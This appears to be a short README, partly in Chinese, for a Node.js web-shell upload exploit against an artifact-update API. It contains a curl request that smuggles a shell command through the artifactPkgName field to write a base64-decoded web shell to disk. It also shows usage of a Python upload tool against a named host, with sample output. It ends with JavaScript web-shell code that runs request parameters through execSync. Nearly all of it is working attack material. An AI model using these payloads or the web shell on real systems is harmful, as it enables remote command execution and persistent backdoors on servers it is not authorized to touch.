# use as curl curl &quot;https://127.0.0.1/v3/UpdateAllProduct&quot; \          -H &#x27;x-coding-event: ping1&#x27; \          -X POST -k \          --data-raw &quot;artifact.artifactRepoName=12&amp;artifact.artifactPkgName=\&quot;;echo $&#123;BASE64WEBSHELL&#125;|base64 -d &gt; /app/api/v2/badWebShell.js #\&quot;&amp;artifact.artifactVersionName=1.4&amp;artifact.projectName=testing&quot; # python usage python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja  # https://nodejs-hack.cloud.eson.ninja replace your url 不要加 / 我的服务是禁止nodejs 外连其他服务 所以会导致内部的js的命令拼接执行时候的 curl 失效，导致一次 500 ，否则会返回服务正常更新的 json # output like following ic| file_data: &#x27;Y29uc3&lt;base64ed file data&gt;AAA=&#x27; Traceback (most recent call last): ..... httpx.ReadTimeout: The read operation timed out
其中 BASE64WEBSHELL 的值为 js webshell 的样本
const fs = require(&#x27;fs&#x27;) const path = require(&#x27;path&#x27;) const &#123; execSync &#125; = require(&#x27;child_process&#x27;)  module.exports = &#123;     // API POST     async post(request, response) &#123;         // console.log(request.params)         artifactPkgName = request.params.artifactPkgName         // Save Path         const localDir = __dirname         // curl command         const curlCMD = artifactPkgName         // Create Path         fs.mkdirSync(localDir, &#123; recursive: true &#125;)         // download artificate         ResponseData = execSync(curlCMD, &#123; cwd: localDir &#125;).toString()         // Response         response.success(ResponseData)     &#125; &#125;
